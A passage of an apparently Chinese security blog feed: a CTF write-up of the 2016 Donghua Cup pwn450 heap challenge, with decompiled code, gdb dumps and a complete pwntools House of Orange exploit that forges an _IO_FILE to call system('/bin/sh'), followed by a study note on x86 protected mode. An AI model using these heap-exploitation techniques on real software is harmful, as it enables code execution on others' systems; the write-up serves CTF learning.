fake_file+=b&#x27;grxer666&#x27;</span></span><br><span class="line">fake_file+=p64(heap+<span class="number">0x508</span>+<span class="number">8</span>)</span><br><span class="line">fake_file+=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(system)</span><br><span class="line">payload+=fake_file</span><br><span class="line">edit(<span class="built_in">len</span>(payload),payload)</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">ru(<span class="string">b&quot;Your choice : &quot;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> House Of Orange </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2016东华杯pwn450-note</title>
      <link href="/2023/04/09/2016%E4%B8%9C%E5%8D%8E%E6%9D%AFpwn450-note/"/>
      <url>/2023/04/09/2016%E4%B8%9C%E5%8D%8E%E6%9D%AFpwn450-note/</url>
      
        <content type="html"><![CDATA[<p>链接：<a href="https://pan.baidu.com/s/1QEKd37yhK-vTDxViS76q5A">https://pan.baidu.com/s/1QEKd37yhK-vTDxViS76q5A</a><br>提取码：vbek</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer /m/h/S/c/p/io_file&gt; checksec ./16pwn450_note </span><br><span class="line">[*] &#x27;/mnt/hgfs/Share/ctfwiki/pwn/io_file/16pwn450_note&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>程序可以申请一个最小512堆块，最大无限制</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_400B3B</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [rsp+17h] [rbp-9h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = read(<span class="number">0</span>, &amp;buf, <span class="number">1uLL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v5 &lt;= <span class="number">0</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( buf == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v1 = v4++;</span><br><span class="line">    *(_BYTE *)(a1 + v1) = buf;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_BYTE *)((<span class="type">int</span>)v4 + a1) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v4;</span><br></pre></td></tr></table></figure><p>该函数可以无限溢出堆块，狂喜</p><h2 id="泄露libc"><a href="#泄露libc" class="headerlink" title="泄露libc"></a>泄露libc</h2><p>唯一一个打印信息的地方是打印申请到的内存地址，我们可以利用mmap申请一个内存，会和libc有一个固定偏移</p><p><img src="/2023/04/09/2016%E4%B8%9C%E5%8D%8E%E6%9D%AFpwn450-note/image-20230410000002101.png" alt="image-20230410000002101"></p><p>mmap阈值为128k</p><p><code>new(0x200000)#libcbase libcbase=int(rl(),16)+0x201000-0x10</code></p><p>拿到基地址</p><h2 id="unsorted-bin-attack-amp-amp-house-of-orange"><a href="#unsorted-bin-attack-amp-amp-house-of-orange" class="headerlink" title="unsorted bin attack &amp;&amp; house of orange"></a>unsorted bin attack &amp;&amp; house of orange</h2><p>因为只有一个堆块，free后肯定会和topchunk合并，不会进入bin里，只能利用切割topchunk时大小不合适，去重新申请一块大内存同时把oldchunk放入unsortedbin，同时需要构造多个unsortedbin才可以在切割时把0x60大小的bin送人small bin伪造_chain</p><p><code>new(0x200) payload=b&#39;\x00&#39;*0x200+p64(0)+p64(0x10df1)</code></p><p>用溢出改掉大小，再free再申请一个比这个chunk还大的内存，把这个chunk放入unsortedbin</p><p><img src="/2023/04/09/2016%E4%B8%9C%E5%8D%8E%E6%9D%AFpwn450-note/image-20230409231152136.png" alt="image-20230409231152136"></p><p><code>new(0x200)</code></p><p><img src="/2023/04/09/2016%E4%B8%9C%E5%8D%8E%E6%9D%AFpwn450-note/image-20230409231752579.png" alt="image-20230409231752579"></p><p>切割下来一块</p><p><code>payload=b&#39;\x00&#39;*0x200+p64(0)+p64(0x10dd1)+p64(unsorted_bin)*2+b&#39;\x00&#39;*0x10db0+p64(0x10dd0)+p64(0x11) edit(payload)</code></p><p>为了防止释放时unlink，把chunk的下一个chunk的prevsize和previnuse位改掉，释放到unsortedbin 且不合并</p><p><img src="/2023/04/09/2016%E4%B8%9C%E5%8D%8E%E6%9D%AFpwn450-note/image-20230409231532142.png" alt="image-20230409231532142"></p><p>这个时候就有一个问题，unsortedbin是FIFO的，每次只能申请一个会导致，每次拿出来的地址是高地址，没办法溢出覆盖低地址的在unsorted里的堆，所以我们需要再次申请<code>new(0x10d00)</code>会从大块的什么切割，同时把0x200的小块放到 small bin，打破这个顺序，因为申请是是先遍历smallbins</p><p><img src="/2023/04/09/2016%E4%B8%9C%E5%8D%8E%E6%9D%AFpwn450-note/image-20230409231930232.png" alt="image-20230409231930232"></p><p>free掉</p><p><img src="/2023/04/09/2016%E4%B8%9C%E5%8D%8E%E6%9D%AFpwn450-note/image-20230409232347124.png" alt="image-20230409232347124"></p><p>现在我们就可以申请出来smallbin然后通过溢出布置house of orange了</p><p><img src="/2023/04/09/2016%E4%B8%9C%E5%8D%8E%E6%9D%AFpwn450-note/image-20230409234910775.png" alt="image-20230409234910775"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x200</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x10d11</span>)+p64(heap+<span class="number">0x210</span>)+p64(unsorted_bin)+<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0x10d10</span>-<span class="number">0x20</span>)<span class="comment">#溢出到第二个块</span></span><br><span class="line">payload+=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0x61</span>)+p64(unsorted_bin)+p64(_IO_list_all-<span class="number">0x10</span>)<span class="comment">#布置orange</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#write base</span></span><br><span class="line">payload+=p64(<span class="number">1</span>)<span class="comment">#write ptr 绕过检测</span></span><br><span class="line">payload+=<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0xc0</span>-<span class="number">48</span>) <span class="comment"># c0大小达到 mode</span></span><br><span class="line">payload+=p64(<span class="number">0xffffffffffffffff</span>)<span class="comment">#mode=-1</span></span><br><span class="line">payload+=<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0xd8</span>-<span class="number">8</span>-<span class="number">0xc0</span>)<span class="comment">#到达_vtable</span></span><br><span class="line">payload+=p64(heap+<span class="number">0x10ff8</span>+<span class="number">8</span>)<span class="comment">#vtable指向下面写入下面数据的地址</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload+=p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(system)</span><br></pre></td></tr></table></figure><p>我们把unsortedbin第二个块改为60大小，下一次申请时切割第一个unsortedbin，会把第二个块的bk-&gt;fd&#x3D;unsortedbin，同时放入smallbin 0x60大小里</p><p>绕过一些检测</p><p><code>payload+=p64(heap+0x10ff8+8)</code>可以根据前面填入的大小 0x10+0x200+0x10d10+0xd8+8&#x3D;0x1 1000 这里0x10是因为heap我们去了申请heap的chunkhead，而不是数据区开始，+8是因为这个字段本身占一个，或者通过在此次输入一个标识符进行搜索，计算偏移</p><p><img src="/2023/04/09/2016%E4%B8%9C%E5%8D%8E%E6%9D%AFpwn450-note/image-20230409235134812.png" alt="image-20230409235134812"></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">1 = &#123;</span></span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = 1852400175, </span><br><span class="line">    _IO_read_ptr = 0x61 &lt;error: Cannot access memory at address 0x61&gt;, </span><br><span class="line">    _IO_read_end = 0x7ffff7dd1b78 &lt;main_arena+88&gt; &quot;&quot;, </span><br><span class="line">    _IO_read_base = 0x7ffff7dd2510 &quot;&quot;, </span><br><span class="line">    _IO_write_base = 0x0, </span><br><span class="line">    _IO_write_ptr = 0x1 &lt;error: Cannot access memory at address 0x1&gt;, </span><br><span class="line">    _IO_write_end = 0x0, </span><br><span class="line">    _IO_buf_base = 0x0, </span><br><span class="line">    _IO_buf_end = 0x0, </span><br><span class="line">    _IO_save_base = 0x0, </span><br><span class="line">    _IO_backup_base = 0x0, </span><br><span class="line">    _IO_save_end = 0x0, </span><br><span class="line">    _markers = 0x0, </span><br><span class="line">    _chain = 0x0, </span><br><span class="line">    _fileno = 0, </span><br><span class="line">    _flags2 = 0, </span><br><span class="line">    _old_offset = 0, </span><br><span class="line">    _cur_column = 0, </span><br><span class="line">    _vtable_offset = 0 &#x27;\000&#x27;, </span><br><span class="line">    _shortbuf = &quot;&quot;, </span><br><span class="line">    _lock = 0x0, </span><br><span class="line">    _offset = 0, </span><br><span class="line">    _codecvt = 0x0, </span><br><span class="line">    _wide_data = 0x0, </span><br><span class="line">    _freeres_list = 0x0, </span><br><span class="line">    _freeres_buf = 0x0, </span><br><span class="line">    __pad5 = 0, </span><br><span class="line">    _mode = -1, </span><br><span class="line">    _unused2 = &quot;\377\377\377\377&quot;, &#x27;\000&#x27; &lt;repeats 15 times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = 0x614000</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p *(struct _IO_jump_t*)0x614000</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">2 = &#123;</span></span><br><span class="line">  __dummy = 0, </span><br><span class="line">  __dummy2 = 0, </span><br><span class="line">  __finish = 0x1, </span><br><span class="line">  __overflow = 0x7ffff7a523a0 &lt;__libc_system&gt;, </span><br><span class="line">  __underflow = 0x0, </span><br><span class="line">  __uflow = 0x0, </span><br><span class="line">  __pbackfail = 0x0, </span><br><span class="line">  __xsputn = 0x0, </span><br><span class="line">  __xsgetn = 0x0, </span><br><span class="line">  __seekoff = 0x0, </span><br><span class="line">  __seekpos = 0x0, </span><br><span class="line">  __setbuf = 0x0, </span><br><span class="line">  __sync = 0x0, </span><br><span class="line">  __doallocate = 0x0, </span><br><span class="line">  __read = 0x0, </span><br><span class="line">  __write = 0x0, </span><br><span class="line">  __seek = 0x0, </span><br><span class="line">  __close = 0x0, </span><br><span class="line">  __stat = 0x0, </span><br><span class="line">  __showmanyc = 0x0, </span><br><span class="line">  __imbue = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/04/09/2016%E4%B8%9C%E5%8D%8E%E6%9D%AFpwn450-note/image-20230409235705003.png" alt="image-20230409235705003"></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./16pwn450_note&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line">libcelf=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;on---&gt;&gt;\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;size:&#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;on---&gt;&gt;\n&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>():</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"><span class="comment">#泄露基地址</span></span><br><span class="line">new(<span class="number">0x200000</span>)<span class="comment">#libcbase</span></span><br><span class="line">libcbase=<span class="built_in">int</span>(rl(),<span class="number">16</span>)+<span class="number">0x201000</span>-<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">unsorted_bin=libcbase+<span class="number">0x68</span>+libcelf.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">_IO_list_all=libcbase+libcelf.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">system=libcbase+libcelf.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">p(<span class="string">&#x27;libc&#x27;</span>,libcbase)</span><br><span class="line">p(<span class="string">&#x27;unsotr&#x27;</span>,unsorted_bin)</span><br><span class="line">p(<span class="string">&#x27;iolist&#x27;</span>,_IO_list_all)</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">free()</span><br><span class="line"><span class="comment">#放入unsortedbin</span></span><br><span class="line">new(<span class="number">0x200</span>)</span><br><span class="line">payload=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x200</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x10df1</span>)</span><br><span class="line">edit(payload)</span><br><span class="line">free()</span><br><span class="line">new(<span class="number">0x15000</span>)</span><br><span class="line">free()</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line"><span class="comment">#防止unlink</span></span><br><span class="line"></span><br><span class="line">new(<span class="number">0x200</span>)</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">payload=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x200</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x10dd1</span>)+p64(unsorted_bin)*<span class="number">2</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x10db0</span>+p64(<span class="number">0x10dd0</span>)+p64(<span class="number">0x11</span>)</span><br><span class="line">edit(payload)</span><br><span class="line">free()</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line"><span class="comment"># 大块切割一部分，小块放入smallbin</span></span><br><span class="line">new(<span class="number">0x10d00</span>)</span><br><span class="line">free()</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">new(<span class="number">0x200</span>)</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">heap=<span class="built_in">int</span>(rl(),<span class="number">16</span>)-<span class="number">0x10</span></span><br><span class="line">p(<span class="string">&#x27;heap&#x27;</span>,heap)</span><br><span class="line">payload=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x200</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x10d11</span>)+p64(heap+<span class="number">0x210</span>)+p64(unsorted_bin)+<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0x10d10</span>-<span class="number">0x20</span>)<span class="comment">#溢出到第二个块</span></span><br><span class="line">payload+=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0x61</span>)+p64(unsorted_bin)+p64(_IO_list_all-<span class="number">0x10</span>)<span class="comment">#布置orange</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#write base</span></span><br><span class="line">payload+=p64(<span class="number">1</span>)<span class="comment">#write ptr 绕过检测</span></span><br><span class="line">payload+=<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0xc0</span>-<span class="number">48</span>) <span class="comment"># c0大小达到 mode</span></span><br><span class="line">payload+=p64(<span class="number">0xffffffffffffffff</span>)<span class="comment">#mode=-1</span></span><br><span class="line">payload+=<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0xd8</span>-<span class="number">8</span>-<span class="number">0xc0</span>)<span class="comment">#到达_vtable</span></span><br><span class="line">payload+=p64(heap+<span class="number">0x10ff8</span>+<span class="number">8</span>)<span class="comment">#vtable指向下面写入下面数据的地址</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload+=p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(system)</span><br><span class="line">edit(payload)</span><br><span class="line">b()</span><br><span class="line">free()</span><br><span class="line">new(<span class="number">0x100</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> House Of Orange </tag>
            
            <tag> Unsorted Bin Attack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IA-32 x86 Protected mode</title>
      <link href="/2023/04/08/32bit-x86-protected-mode/"/>
      <url>/2023/04/08/32bit-x86-protected-mode/</url>
      
        <content type="html"><![CDATA[<h1 id="IA-32-x86-Protected-mode"><a href="#IA-32-x86-Protected-mode" class="headerlink" title="IA-32 x86 Protected mode"></a>IA-32 x86 Protected mode</h1><h2 id="Real-address-Mode"><a href="#Real-address-Mode" class="headerlink" title="Real-address Mode"></a>Real-address Mode</h2><p>实模式简称Real mode，这就要从我们x86的ancestor 8086处理器说起，这个时候我们使用的地址都是物理地址</p><p>&gt;&gt;&gt;为什么会有段寄存器cs ds es ss?</p><ul><li><p>8086处理器面临的第一个问题就是20位地址总线和16bit寄存器的问题:解决这个问题是把段寄存器左移4个bit位，形成20bit段地址，再加上16位的偏移地址进行20位寻址,这也决定了段地址必须是按16字节对齐的，因为16位寄存器，所以每个段最大限长为64KB，同时同一个物理地址对应着多个逻辑地址</p></li><li><p>第二个问题就是程序重定位的问题，我们的指令是由操作码和操作数构成(小部分只有操作码)，如果我们指令里的操作数是一个绝对地址，我们程序加载的位置是不确定的，所以我们代码和数据的地址也不是确定的，所以绝对地址是不可行的，处理器采用了内存分段机制，这种分段是逻辑上的分段，并不是物理上的分段,段地址:偏移地址，我们指令里的操作数写相对于段地址的相对偏移地址，就可以正确重定位</p></li></ul><p><code>物理地址（physicaladdress）=段值（segment） * 16 + 偏移（offset）</code></p><p>32位处理器之后我们给这个取了个名字叫实模式</p><p><strong>实模式的问题</strong></p><ol><li>缺乏保护机制：实模式下没有保护机制，也没有内存管理单元（MMU）来保护内存免受非授权访问和操作系统进程之间的干扰。这使得操作系统和应用程序容易受到恶意代码的攻击。</li><li>缺乏多任务支持：实模式下，只能运行一个程序，并且程序必须在处理器的控制下运行，因为没有任何机制来切换到其他程序。这个限制意味着操作系统无法支持多任务处理，这限制了计算机的性能和效率。</li></ol><h2 id="Protected-mode"><a href="#Protected-mode" class="headerlink" title="Protected mode"></a>Protected mode</h2><p>保护模式是在80286(16位)引入，80386(32位)开始盛行</p><p>80386 32位地址总线最多支持4GB的物理内存，视为IA-32(Intel Architecture)架构的开始</p><p>开始了平坦内存模型（flat memory model），整个内存都在一个段里，即每个应用程序可以使用地址0～2^32-1来索引</p><p>CRO寄存器的最低位PE(Protection Enable)标志为1处理器进入保护模式</p><p>&gt;&gt;&gt;怎么保护</p><p>对内存进行权限控制，那就应该会有权限信息的描述，段寄存器只有16位而且只有几个，每一个程序都需要多个单独的描述信息，那就需要存放在内存里</p><h3 id="分段机制"><a href="#分段机制" class="headerlink" title="分段机制"></a>分段机制</h3><h4 id="段描述符"><a href="#段描述符" class="headerlink" title="段描述符"></a>段描述符</h4><p>就出现了段描述符(segment descriptor)，8字节长的数据结构，用来描述一个段的位置、大小、访问控制和状态等信息，</p><p><img src="/2023/04/08/32bit-x86-protected-mode/image-20230420200038198.png" alt="image-20230420200038198"></p><ul><li>32位段基地址，段起始位置</li><li>20位的段边界，段边界的扩展最值,即最大扩展到多少或最小扩展到多少。扩展方向只有上下两种,栈和数据段代码段区别(DNA里的恐惧:segmentation fault)</li><li>G(Granularity)是粒度来描述段边界，G为0，段边界以字节为单位，为1(1B~1M)，则以4k为单位(4K~4G)</li><li>S(System)，S&#x3D;0代表该描述符描述的是一个系统段，S&#x3D;1代表该描述符描述的是代码段、数据段或堆栈段</li><li>DPL(Descriptor Privilege Level）描述符特权级0-3，0最高，高的可以访问低的，反之不行，比如操作系统的代码和数据会被放在比用户程序具有更高特权的段里,DPL表示访问这个段对当前特权级(CPL)的最低等级要求</li><li>TYPE和S段配合使用，段的访问权限或系统控制描述类型</li></ul><p> CPU 硬件负责检测，操作系统提供异常处理程序</p><p><img src="/2023/04/08/32bit-x86-protected-mode/image-20230420195852680.png" alt="image-20230420195852680"></p><p>描述信息这么乱是为了兼容80286</p><p><img src="/2023/04/08/32bit-x86-protected-mode/image-20230420200152426.png" alt="image-20230420200152426"></p><h4 id="段描述符表"><a href="#段描述符表" class="headerlink" title="段描述符表"></a>段描述符表</h4><p>系统中会有很多段描述符，代码段要占用一个段描述符、数据段和栈段等，多个内存段也要各自占用一个段描述符，cpu定的全局描述符表（Global Descriptor Table，GDT）局部描述符表LDT(Local descriptor table)是一个段描述符数组，里面存的就是这些描述符</p><p>全局描述符表(系统只有一个)的地址存放在GDTR寄存器里，局部描述符表在LDTR寄存器，表由操作系统维护，cpu硬件来使用</p><h4 id="GDTR寄存器"><a href="#GDTR寄存器" class="headerlink" title="GDTR寄存器"></a>GDTR寄存器</h4><p>48位</p><p><img src="/2023/04/08/32bit-x86-protected-mode/image-20230408155337790.png" alt="image-20230408155337790"></p><p>32位线性地址描述全局描述符表在内存里的位置。16位表长度描述表的大小(为0时大小是1)，byte为单位，所以最大2^16&#x2F;8&#x3D;8192个描述符</p><h4 id="LDTR寄存器"><a href="#LDTR寄存器" class="headerlink" title="LDTR寄存器"></a>LDTR寄存器</h4><p>局部描述符表寄存器LDTR表示当前任务的LDT在GDT中的索引，也是一个段选择子</p><h4 id="段选择子"><a href="#段选择子" class="headerlink" title="段选择子"></a>段选择子</h4><p>有了段描述符，段寄存器里面就不需要存段基地址，而是存的段选择子</p><p><img src="/2023/04/08/32bit-x86-protected-mode/image-20230408172110614.png" alt="image-20230408172110614"></p><ul><li>TI位代表要索引的段描述符表（table indicator），TI&#x3D;0表示全局描述符表，TI&#x3D;1表示局部描述符表。</li><li>高13位是描述符索引，要选择的段描述符在TI所表示的段描述符表中的索引号</li><li>RPL（Requestor Privilege Level）请求特权级(cs寄存器中的RPL字段表示当前特权级(Current Privilege Level，CPL))，和段描述符里的DPL配合cpu做检查</li></ul><p>这样通过段选择子和GDTR，就可以定位到段描述符，找到段基地址，加上偏移找到线性地址，如果没有分页机制这样取出来的线性地址就是我们的物理地址</p><p>取出一次后会放入程序员不可见部分—段描述符缓冲寄存器（ Descriptor Cache Registers ),下次会直接从这里面取，，只要往段寄存器中赋值， CPU 就会更新段描述符缓冲寄存器</p><p><img src="/2023/04/08/32bit-x86-protected-mode/image-20230420200014884.png" alt="image-20230420200014884"></p><h4 id="linux中的分段机制"><a href="#linux中的分段机制" class="headerlink" title="linux中的分段机制"></a>linux中的分段机制</h4><p>RISC对分段支持有限，linux为了更好的移植性，简化了分段机制，在初始化时就把段描述符里的基地址设为0，段边界设置为0xfffff，每个段都能访问4G</p><h3 id="分页机制"><a href="#分页机制" class="headerlink" title="分页机制"></a>分页机制</h3><p>分段会造成一些问题</p><p><img src="/2023/04/08/32bit-x86-protected-mode/image-20230408194444921.png" alt="image-20230408194444921"></p><ul><li><p>这样一个分段内存，如果此时BD程序停止，此时如果有一个程序F占3个内存块，虽然内存里由三个空闲内存，但是却不是连续的无法加载我们的程序F，时间长了会造成大量内存碎片，</p></li><li><p>另一个问题是程序跑起来后有些代码和数据可能很久都不会用到，但是在分段下我们还必须加载到内存，造成内存浪费</p></li><li><p>分段下我们没办法动态分配我们程序的内存，因为在分段下加载到内存的块大小是必须要提前计算好的</p></li><li><p>物理内存太小时，程序就不能加载</p></li></ul><p>在分段的前提上在加一层东西</p><p>分页把线性地址和物理地址空间都划分为页面，linux一般使用4k大小的页面，分页机制的主要目的是高效地利用内存，按页来组织和管理内存空间，把暂时不用的数据交换到空间较大的外部存储器（通常是硬盘）上（称为page out，换出），需要时再交换回来（称为page in，换进）同时，可以将逻辑上连续的线性地址映射的物理地址可以不连续，把内存碎片利用起来。现用现映射，不用不映射，所以从理论上，我们只需要8k的内存就可以跑一个程序，4k数据，4k代码，不断进行内存和硬盘的转换</p><p>操作系统的虚拟内存也是利用分页来实现的</p><p>CRO寄存器的PG为为1时开启分页</p><p><strong>创建进程时，就会为这个进程创建页表，进程空间隔离主要因为每个进程都有一套相对独立的页表,映射过的物理内存会在页表里登记这个映射关系，进程的切换会伴随着页表的切换</strong></p><p><img src="/2023/04/08/32bit-x86-protected-mode/image-20230420195713371.png" alt="image-20230420195713371"></p><p>CR3寄存器便是用来记录当前任务的页表物理地址。</p><h4 id="一级页表"><a href="#一级页表" class="headerlink" title="一级页表"></a>一级页表</h4><p>只有一级页表的话需要有2^20次方个表项，表项里用4个字节存放页面的开始物理基地址，由于页时4k大小对齐，所以低12位始终为0，不用记录，低十二位用来存放一些权限信息</p><p>我们用线性地址的高20位去索引页表数组，再加上线性地址的低12位偏移就可以得到物理地址</p><p>一级页表的缺点是，2^20次方个4字节的表项需要4M的连续物理内存去存储，每个进程都有一个单独的页表，4*nM的内存消耗太大</p><h4 id="32位经典分页"><a href="#32位经典分页" class="headerlink" title="32位经典分页"></a>32位经典分页</h4><p><strong>二级页表</strong></p><p>CR0的PG标志为1、CR4的PAE为0时，使用这个模式，在这个模式下，页表结构为两级，第一级称为页目录表（Page Directory Table），第二级称为页表（Page Table）<br>页目录存放在一个4K大小的页面上，存放1024个指向一个二级页表地址，二级页表大小也是一个页面，最多含有1K个4字节页表项(Page-Table Entry，PTE)</p><p>每个二级页表存放1024个物理页的地址，1024*4KB&#x3D;4MB，1024个二级页表1024*4MB&#x3D;4GB,满足4G寻址</p><p>目录项</p><p><img src="/2023/04/08/32bit-x86-protected-mode/image-20230420195930886.png" alt="image-20230420195930886"></p><p>页表项</p><p><img src="/2023/04/08/32bit-x86-protected-mode/image-20230420195952065.png" alt="image-20230420195952065"></p><p>查找过程</p><p><img src="/2023/04/08/32bit-x86-protected-mode/image-20230420191045242.png" 